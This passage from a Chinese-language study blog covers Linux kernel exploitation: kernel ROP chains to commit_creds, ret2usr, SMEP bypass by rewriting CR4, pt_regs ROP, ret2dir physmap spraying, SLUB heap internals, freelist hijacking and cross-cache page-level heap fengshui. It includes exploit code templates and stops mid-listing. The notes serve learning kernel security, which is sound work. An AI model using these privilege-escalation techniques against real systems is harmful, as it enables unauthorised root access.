    <content type="html"><![CDATA[<p>十天速通<code>kernel</code>基础理论了属于是…画了个思维导图加深一下印象</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.png" class><h2 id="ROP（returned-oriented-programming）"><a href="#ROP（returned-oriented-programming）" class="headerlink" title="ROP（returned oriented programming）"></a>ROP（returned oriented programming）</h2><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>构造<code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code></p><ul><li><code>kallsyms</code>中存在<code>commit_creds</code>和<code>prepare_kernel_cred</code>函数地址</li><li><code>init</code>中<code>dmesg_restrict=1</code>时不能使用<code>dmesg</code>查看<code>kernel</code>信息</li></ul><h4 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h4><p>保存各寄存器的值到内核栈上便于后续回到用户态，模板如下，编译时指定参数<code>-masm=intel</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs, cs;"</span>            <span class="token string">"mov user_ss, ss;"</span>            <span class="token string">"mov user_sp, rsp;"</span>            <span class="token string">"pushf;"</span>            <span class="token string">"pop user_rflags;"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[*] Status has been saved.\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h5><ul><li><code>swapgs</code>指令恢复用户态 <code>GS</code> 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 <code>gadget</code> 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 <code>rop</code> 链以返回用户态并获得一个 <code>shell</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">↓   swapgs    iretq    user_shell_addr    user_cs    user_eflags //64bit user_rflags    user_sp    user_ss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p><code>smap/smep</code>未开启的时候内核可以访问执行用户空间数据，所以可以通过<code>kernel rop</code>以内核<code>ring 0</code>权限执行用户空间代码，主要是执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，需要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接<code>ret</code>回到用户空间执行</p><h3 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass-smep"></a>bypass-smep</h3><h4 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h4><p>为了防止 <code>ret2usr</code> 攻击，内核开发者提出了 <code>smep</code> 保护，当 CPU 处于 <code>ring0</code> 模式时，执行用户空间的代码会触发页错误，这个保护在 <code>arm</code> 中被称为 <code>PXN</code></p><h4 id="smep-和-CR4-寄存器"><a href="#smep-和-CR4-寄存器" class="headerlink" title="smep 和 CR4 寄存器"></a>smep 和 CR4 寄存器</h4><p>系统根据 <code>CR4</code> 寄存器的值判断是否开启 <code>smep</code> 保护，当 <code>CR4</code> 寄存器的第 <code>20</code> 位是 <code>1</code> 时，保护开启,是 <code>0</code> 时，保护关闭</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/smep.jpg" class><p><code>CR4</code> 寄存器可以通过 <code>mov</code> 指令修改<code>cr4</code>来关闭<code>smep</code>保护</p><pre class="line-numbers language-none"><code class="language-none">mov cr4, 0x1407e0# 0x1407e0 &#x3D; 101 0 0000 0011 1111 00000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>搜索一下从 <code>vmlinux</code> 中提取出的 <code>gadget</code>，很容易就能达到这个目的</p><ul><li>查看 <code>CR4</code> 寄存器的值<ul><li><code>gdb</code> 无法查看 <code>cr4</code> 寄存器的值，可以通过 <code>kernel crash</code> 时的信息查看。为了关闭 <code>smep</code> 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code></li></ul></li></ul><h3 id="利用-pt-regs-构造通用内核-ROP"><a href="#利用-pt-regs-构造通用内核-ROP" class="headerlink" title="利用 pt_regs 构造通用内核 ROP"></a>利用 pt_regs 构造通用内核 ROP</h3><h4 id="系统调用-与-pt-regs-结构体"><a href="#系统调用-与-pt-regs-结构体" class="headerlink" title="系统调用 与 pt_regs 结构体"></a>系统调用 与 pt_regs 结构体</h4><p>系统调用：用户态布置好相应的参数后执行 <code>syscall</code> 进入到内核中的 <code>entry_SYSCALL_64</code>，随后通过系统调用表跳转到对应的函数</p><p><code>entry_SYSCALL_64</code> ：当程序进入到内核态时，该函数会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token punctuation">&#123;</span><span class="token comment">/* * C ABI says these regs are callee-preserved. They aren't saved on kernel entry * unless syscall needs a complete, fully filled "struct pt_regs". */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r15<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r14<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r13<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r12<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rbp<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rbx<span class="token punctuation">;</span><span class="token comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r11<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r10<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r9<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> r8<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rax<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rcx<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rdx<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rsi<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rdi<span class="token punctuation">;</span><span class="token comment">/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> orig_rax<span class="token punctuation">;</span><span class="token comment">/* Return frame for iretq */</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rip<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> cs<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eflags<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> rsp<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ss<span class="token punctuation">;</span><span class="token comment">/* top of stack page */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内核栈与通用ROP"><a href="#内核栈与通用ROP" class="headerlink" title="内核栈与通用ROP"></a>内核栈与通用ROP</h4><p>内核栈<strong>只有一个页面的大小</strong>，而 <code>pt_regs</code> 结构体则固定位于<strong>内核栈栈底</strong>，劫持内核结构体中的某个函数指针（例如 <code>seq_operations-&gt;start</code>）并通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>系统调用过程中的这些寄存器为我们布置 <code>ROP</code> 链提供了可能，<strong>只需要寻找到一条形如 <code>add rsp, val ; ret</code> 的 gadget 便能够完成 ROP</strong></p><p>模板：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__asm__(    &quot;mov r15,   0xbeefdead;&quot;    &quot;mov r14,   0x11111111;&quot;    &quot;mov r13,   0x22222222;&quot;    &quot;mov r12,   0x33333333;&quot;    &quot;mov rbp,   0x44444444;&quot;    &quot;mov rbx,   0x55555555;&quot;    &quot;mov r11,   0x66666666;&quot;    &quot;mov r10,   0x77777777;&quot;    &quot;mov r9,    0x88888888;&quot;    &quot;mov r8,    0x99999999;&quot;    &quot;xor rax,   rax;&quot;    &quot;mov rcx,   0xaaaaaaaa;&quot;    &quot;mov rdx,   8;&quot;    &quot;mov rsi,   rsp;&quot;    &quot;mov rdi,   seq_fd;&quot;        &#x2F;&#x2F; 这里假定通过 seq_operations-&gt;stat 来触发    &quot;syscall&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新版本内核中为系统调用栈添加了一个偏移值，这意味着 <code>pt_regs</code> 与我们触发劫持内核执行流时的栈间偏移值不再是固定值，在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 <code>slide gadget</code> 来继续完成利用，不过稳定性也大幅下降了</p><h3 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h3><p>主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong></p><p>我们首先来思考一下 <code>x86</code> 下的 <code>Linux kernel</code> 的内存布局，存在着这样的一块区域叫做 <code>direct mapping area</code>，<strong>线性地直接映射了整个物理内存空间</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffff888000000000 <span class="token operator">|</span> <span class="token parameter variable">-119.5</span>  TB <span class="token operator">|</span> ffffc87fffffffff <span class="token operator">|</span>   <span class="token number">64</span> TB <span class="token operator">|</span> direct mapping of all physical memory <span class="token punctuation">(</span>page_offset_base<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这块区域的存在意味着：对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框</p><p>当开启了 <code>SMEP、SMAP、PXN</code> 等防护时，内核空间到用户空间的直接访问被禁止，<strong>我们无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>我们可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong></p><p>下图是<code>ret2dir</code> 的示例，在用户空间中布置的 <code>gadget</code> 可以通过 <code>direct mapping area</code> 上的地址<strong>在内核空间中访问到</strong>：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/ret2dir-shellcode.png" class><p>新版的内核当中 <code>direct mapping area</code> 已经不再具有可执行权限，因此很难在用户空间直接布置 <code>shellcode</code> 进行利用，但仍能通过在用户空间布置 <code>ROP</code> 链的方式完成利用：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/ret2dir-rop.png" class><p><code>ret2dir</code> 攻击的手法：</p><ul><li>利用 <code>mmap</code> 在用户空间大量喷射内存</li><li>利用漏洞泄露出内核的 “堆” 上地址（通过 <code>kmalloc</code> 获取到的地址），<strong>这个地址<u>直接来自于线性映射区</u></strong></li><li>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存</li></ul><p>此时获得了一个映射到用户空间的内核空间地址，通过这个内核空间地址便能直接访问到用户空间的数据，避开传统的隔绝用户空间与内核空间的防护手段</p><p>需要注意的是我们往往没有内存搜索的机会，因此需要使用 <code>mmap</code> 喷射大量的物理内存写入同样的 <code>payload</code>，之后再随机挑选一个线性映射区上的地址进行利用，这样就有很大的概率命中到我们布置的 <code>payload</code> 上，这种攻击手法也称为 <code>physmap spray</code></p><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="内存三级结构"><a href="#内存三级结构" class="headerlink" title="内存三级结构"></a>内存三级结构</h4><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/page-zone-node.png" class><ul><li><p>页-<code>page</code></p><p><code>linux kernel</code>使用<code>page</code>结构体表示一个物理页，对应图中结构体<code>page</code></p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/page_struct.png" class></li><li><p>区-<code>zone</code></p><p><code>linux</code>将一个<strong>节点内</strong>不同用途的内存区域划分为不同的区，对应图中结构体<code> zone</code></p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/zone_struct.png" class></li><li><p>节点-<code>node</code></p><p><code>Linux</code> 将内存控制器（<code>memory controller</code>）作为节点划分的依据，同一个内存控制器下的 <code>CPU</code> 对应的节点称之为<strong>本地内存</strong>，不同处理器之间通过总线进行进一步的连接，对应图中结构体<code>pgdata_list</code></p></li></ul><h4 id="内存管理器"><a href="#内存管理器" class="headerlink" title="内存管理器"></a>内存管理器</h4><ul><li><p><code>buddy system</code></p><p>负责以<strong>内存页</strong>为粒度管理所有可用的物理内存,存在于<strong>区级别</strong>，对当前区的所有物理页进行管理，每个区<code>zone</code>结构体中有<code>free_area</code>结构体数组，存储<code>buddy system</code>按照<code>order</code>管理的页面，其中<code>MAX_ORDER = 11</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">zone</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span>    <span class="token keyword">struct</span> <span class="token class-name">free_area</span>    free_area<span class="token punctuation">[</span>MAX_ORDER<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>buddy system</code> 中按照空闲页面的连续大小进行分阶管理，这里的 <code>order</code> 的实际含义为<strong>连续的空闲页面的大小</strong>，单位是<code>阶</code>，即对于每个下标存储的页面大小为<code>2^order</code>，参考区结构体的图</p><ul><li><p>分配：</p><p>大小向 <code>2</code> 的幂次方内存页大小对齐，从对应的下标取出连续内存页，若对应下标链表为空，则会从下一个 <code>order</code> 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用</p></li><li><p>释放：</p><p>将对应的连续内存页释放到对应的链表上，检索是否有可以合并的内存页，若有则进行合成，放入更高 <code>order</code> 的链表中</p></li></ul></li><li><p><code>slab allocator</code></p><ul><li><p>向<code>buddy system</code>请求内存页（<code>sllub</code>）并分割成同等大小的<strong>对象</strong>（<code>object</code>，被分配实体）返还给上层调用者以进行细粒度的内存管理</p></li><li><p>分为<code>slab</code>、<code>slob</code>、<code>slub</code>三种版本，其中<code>slub</code>是现在通用的版本，其结构如下：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/slub_allocator.png" class><p><code>slub</code> 的<strong>第一张内存页</strong>的 <strong><code>page</code> 结构体</strong>的 <strong><code>freelist</code> 成员</strong>指向该张<strong>内存页</strong>上的<strong>第一个空闲对象</strong>，一个 <code>slub</code> 上的所有空闲对象组成一个以 <code>NULL</code> 结尾的单向链表</p><blockquote><p><code>object</code> 类似<code> glibc</code> 中的 <code>chunk</code>，但是不需要<code>header</code>，因为 <code>page </code>结构体与物理内存间存在线性对应关系</p></blockquote></li><li><p><code>kmem_cache</code> ：基本的 <code>allocator</code> 组件，用于分配某个特定大小或用途的对象，所有的 <code>kmem_cache</code>构成一个双向链表，并存在两个对应的结构体数组 <code>kmalloc_caches</code> 与 <code>kmalloc_dma_caches</code></p><p>组成模块：</p><ul><li><code>kmem_cache_cpu</code>：**<code>percpu</code> 变量<strong>（以 <code>gs</code> 寄存器作为 <code>percpu</code> 段的基址，每个核心上都通过段寻址来独立保留一个副本），用以表示当前核心正在使用的 <code>slub</code>，因此当前 <code>CPU</code> 在从 <code>kmem_cache_cpu</code> 上取 <code>object </code>时</strong>不需要加锁**，极大地提高了性能</li><li><code>kmem_cache_node</code>:当前<code>kmem_cache</code>的<code> slub</code> 集散中心，其中存放着两个 <code>slub</code> 链表：<ul><li><code>partial</code>：部分 <code>object</code>空闲</li><li><code>full</code>：所有<code>object</code>都被分配出去</li></ul></li></ul></li><li><p>分配：</p><ul><li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回</li><li>若 <code>kmem_cache_cpu</code> 上的 <code>slub</code> 已经无空闲对象了，对应 <code>slub</code> 会被从 <code>kmem_cache_cpu</code> 上取下，并尝试从 <strong><code>partial</code></strong> 链表上取一个 <code>slub</code> 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回</li><li>若 <code>kmem_cache_node</code> 的 <code>partial</code> 链表也空了，那就<strong>向 <code>buddy system</code> 请求分配新的内存页</strong>，划分为多个 <code>object</code> 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用</li></ul></li><li><p>释放：</p><ul><li>若被释放 <code>object</code> 属于 <code>kmem_cache_cpu</code> 的 <code>slub</code>或<code>kmem_cache_node</code> 的 <code>partial</code> 链表上的 <code>slub</code>，直接使用头插法插入当前 <code>CPU slub</code> 或对应<code>slub</code>的 <code>freelist</code></li><li>若被释放 <code>object </code>为 <code>full slub</code>，则成为对应 <code>slub</code> 的 <code>freelist</code> 头节点，<strong>且该 slub 会被放置到 partial 链表</strong></li></ul></li></ul></li></ul><h3 id="slub-allocator"><a href="#slub-allocator" class="headerlink" title="slub allocator"></a>slub allocator</h3><h4 id="kernel-UAF"><a href="#kernel-UAF" class="headerlink" title="kernel UAF"></a>kernel UAF</h4><p><strong>对于释放后未重置的垂悬指针的利用</strong>,内核的 “堆内存” 主要指的是直接映射区（<code>direct mapping area</code>）</p><h5 id="内核堆利用与绑核"><a href="#内核堆利用与绑核" class="headerlink" title="内核堆利用与绑核"></a>内核堆利用与绑核</h5><p>在多核架构下存在多个 <code>kmem_cache_cpu</code> ，利用过程中<code>kernel object</code>的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，降低了漏洞利用的成功率，因此需要将进程绑定到特定的某个 <code>CPU</code> 核心上，这样 <code>slub allocator</code> 的模型就简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> </p><p>进程绑定至指定核心的模板:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通用-kmalloc-flag"><a href="#通用-kmalloc-flag" class="headerlink" title="通用 kmalloc flag"></a>通用 kmalloc flag</h5><p><code>GFP_KERNEL</code> 、 <code>GFP_KERNEL_ACCOUNT</code> ：内核中最为常见与通用的分配 <code>flag</code>，分配都来自同一个 <code>kmem_cache</code>，即通用的 <code>kmalloc-xx</code></p><p><code>GFP_KERNEL_ACCOUNT</code> 多了一个表示该对象与来自用户空间的数据相关联的属性，因此诸如 <code>msg_msg</code> 、<code>pipe_buffer</code>、<code>sk_buff</code>的数据包的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> </p><p>而 <code>ldt_struct</code> 、<code>packet_socket</code> 等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code></p><p>在 <code>5.9</code> 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，后来取消了隔离机制，自内核版本 <code>5.14</code> 起又重新引入：</p><ul><li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 <code>kernel</code> 而言（默认开启），会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象创建一组独立的 <code>kmem_cache</code> ,名为 <code>kmalloc-cg-*</code> ，从而导致使用这两种 <code>flag</code> 的 <code>object</code> 之间的隔离</li></ul><h5 id="slub-合并-amp-隔离"><a href="#slub-合并-amp-隔离" class="headerlink" title="slub 合并 &amp; 隔离"></a>slub 合并 &amp; 隔离</h5><p><code>slab alias</code>机制是一种对同等或相近大小<code>object</code>的 <code>kmem_cache</code> 进行复用的机制</p><p>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等或近似大小的 <code>object</code>的 <code>kmem_cache</code> ，则不会创建新的<code>kmem_cache</code>，而是为原有的<code>kmem_cache</code>起一个<code>alias</code>，作为新的<code>kmem_cache</code>返回</p><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 的 <code>kmem_cache</code> 会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 <code>alias</code>,如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p><h4 id="Heap-Spray"><a href="#Heap-Spray" class="headerlink" title="Heap Spray"></a>Heap Spray</h4><p><strong>堆喷射</strong>（<code>heap spraying</code>）：通过大量分配相同的结构体来达成某种特定的内存布局，应用场景：</p><ul><li><code>UAF</code>，无法通过少量内存分配拿到该结构体，例如该 <code>object</code> 不属于当前<code>freelist</code>且释放后会回到<code>node</code>上，或是像 <code>add_key()</code> 会被一直卡在第一个临时结构体上，可以通过堆喷射来确保拿到该<code>object</code></li><li>堆溢出读&#x2F;写，但是堆布局不可知，比如开启了 <code>SLAB_FREELIST_RANDOM</code>（默认开启），可以预先喷射大量特定结构体，从而保证对其中某个结构体的溢出</li></ul><h4 id="freelist劫持"><a href="#freelist劫持" class="headerlink" title="freelist劫持"></a>freelist劫持</h4><p>与用户态 <code>glibc</code> 中分配 <code>fake chunk</code> 后覆写 <code>__free_hook</code> 这样的手法类似，我们同样可以通过覆写 <code>freelist</code> 中的 <code>next</code> 指针的方式完成内核空间中任意地址上的对象分配，并修改内核当中一些有用的数据以完成提权，例如一些函数表等</p><h3 id="Buddy-System"><a href="#Buddy-System" class="headerlink" title="Buddy System"></a>Buddy System</h3><h4 id="Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui"><a href="#Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui" class="headerlink" title="Cross-Cache Overflow &amp; Page-level Heap Fengshui"></a>Cross-Cache Overflow &amp; Page-level Heap Fengshui</h4><h5 id="Cross-Cache-Overflow"><a href="#Cross-Cache-Overflow" class="headerlink" title="Cross-Cache Overflow"></a>Cross-Cache Overflow</h5><p>针对<code>buddy system</code>的利用手法，内存中用作不同<code>kmem_cache</code>的页面内存上可能相邻，若漏洞对象页面与溢出目标对象页面相邻，则可能实现跨越不同<code>kmem_cache</code>之间的堆溢出，但是需要非常严苛的页级堆排布，此时就需要页级堆风水</p><h5 id="Page-level-Heap-Fengshui"><a href="#Page-level-Heap-Fengshui" class="headerlink" title="Page-level Heap Fengshui"></a>Page-level Heap Fengshui</h5><p>以内存页为粒度的内存排布方式，纯手工构造一个新的已知的页级粒度内存页排布</p><p><code>slub allocator</code> 向 <code>buddy system</code> 请求页面的过程，当 <code>freelist page</code> 已经耗空且 <code>partial</code> 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 <code>buddy system</code> 申请页面：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/slub-new-page.png" class><p><code>buddy system</code>其基本原理就是以 <code>2</code> 的 <code>order</code> 次幂张内存页作为分配粒度，相同 <code>order </code>间空闲页面构成双向链表，当低阶 <code>order </code>的页面不够用时便会从高阶 <code>order</code> 取一份连续内存页拆成两半，其中一半挂回当前请求 <code>order</code> 链表，另一半返还给上层调用者</p><p>从更高阶 <code>order</code> 拆分成的两份低阶 <code>order</code> 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p><ul><li>向 <code>buddy system</code> 请求两份连续的内存页</li><li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li><li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li></ul><p>此时我们便有可能溢出到其他的内核结构体上，从而完成 <code>cross-cache overflow</code></p><p>利用：<code>setsockopt</code> 与 <code>pgv </code>完成页级内存占位与堆风水</p><p>创建一个 <code>protocol</code> 为 <code>PF_PACKET</code> 的 <code>socket</code> 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__sys_setsockopt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    sock<span class="token operator">-></span>ops<span class="token operator">-></span><span class="token function">setsockopt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">packet_setsockopt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// case PACKET_TX_RING ↓</span>            <span class="token function">packet_set_ring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">alloc_pg_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 <code>2^order</code> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">pgv</span> <span class="token operator">*</span><span class="token function">alloc_pg_vec</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tpacket_req</span> <span class="token operator">*</span>req<span class="token punctuation">,</span> <span class="token keyword">int</span> order<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> block_nr <span class="token operator">=</span> req<span class="token operator">-></span>tp_block_nr<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pgv</span> <span class="token operator">*</span>pg_vec<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    pg_vec <span class="token operator">=</span> <span class="token function">kcalloc</span><span class="token punctuation">(</span>block_nr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pgv</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL <span class="token operator">|</span> __GFP_NOWARN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>pg_vec<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">goto</span> out<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> block_nr<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pg_vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> <span class="token function">alloc_one_pg_vec_page</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>pg_vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>buffer<span 